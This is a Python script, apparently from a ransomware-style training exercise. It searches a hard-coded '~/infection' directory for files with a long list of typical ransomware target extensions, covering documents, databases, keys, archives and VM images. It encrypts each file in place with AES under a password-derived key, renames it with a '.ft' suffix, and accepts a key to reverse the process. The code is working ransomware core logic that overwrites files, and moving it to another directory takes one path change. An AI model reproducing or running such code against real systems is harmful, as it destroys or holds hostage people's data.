import argparse
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto import Random
import os

parser = argparse.ArgumentParser(description="Encrypt all files present in ~/infection")
parser.add_argument("-v", action="store_true", help="Print the version of the program")
parser.add_argument("-r", metavar="key", help="Reverse the encryption")
parser.add_argument("-s", action="store_true", help="Do not show encrypted files")
args = parser.parse_args()

if not args.r and not args.v:
	password = input("Enter password: ")
extensions = ['.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif', '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm', '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc']

BLOCK_SIZE = 16

def pad(s):
    pad_length = BLOCK_SIZE - len(s) % BLOCK_SIZE
    return s + (pad_length * chr(pad_length)).encode()

def unpad(s):
    return s[:-s[-1]]

def aes_encrypt(raw, key):
	private_key = hashlib.sha256(key.encode()).digest()
	raw = pad(raw)
	iv = Random.new().read(AES.block_size)
	cipher = AES.new(private_key, AES.MODE_CBC, iv)
	return base64.b64encode(iv + cipher.encrypt(raw))

def aes_decrypt(enc, key):
	private_key = hashlib.sha256(key.encode()).digest()
	enc = base64.b64decode(enc)
	iv = enc[:16]
	cipher = AES.new(private_key, AES.MODE_CBC, iv)
	return unpad(cipher.decrypt(enc[16:]))

def encrypt():
	files = find_files(extensions)
	for file in files:
		try:
			with open(file, 'rb') as f:
				content = f.read()
			encrypted = aes_encrypt(content, password)
			if not encrypted:
				continue
			with open(file, 'wb') as f:
				f.write(encrypted)
			if not args.s:
				print(file)
			os.rename(file, file + '.ft')
		except:
			pass


def decrypt(key):
	files = find_files((".ft"))
	for file in files:
		try:
			with open(file, 'rb') as f:
				content = f.read()
			decrypted = aes_decrypt(content, key)
			if not decrypted:
				continue
			with open(file, 'wb') as f:
				f.write(decrypted)
			if not args.s:
				print(file)
			os.rename(file, file[:-3])
		except:
			pass

	
def find_files(extensions):
	found = []
	for root, dirnames, files in os.walk('/home/tedelin/infection'):
		for filename in files:
			if filename.endswith(tuple(extensions)):
				found.append(os.path.join(root, filename))
	return found


if args.v:
	print("Version 1.0")
if args.r:
	decrypt(args.r)
elif not args.r:
	encrypt()
